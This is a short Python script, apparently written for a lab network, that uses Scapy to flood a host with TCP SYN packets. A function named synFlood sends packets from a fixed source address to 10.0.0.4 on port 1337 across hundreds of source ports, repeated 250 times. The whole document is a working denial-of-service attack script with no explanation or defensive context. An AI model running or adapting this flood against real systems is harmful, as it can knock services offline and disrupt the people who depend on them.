from scapy.all import *
def synFlood(src,tgt):
    for sport in range(1024,1500):
        L3=IP(src=src , dst=tgt)
        L4= TCP(sport=sport , dport=1337)
        pkt=L3/L4
        send(pkt)
for i in range(0,250):
    src = "10.0.0.1"
    i+=1
    tgt = "10.0.0.4"
    synFlood(src,tgt) 
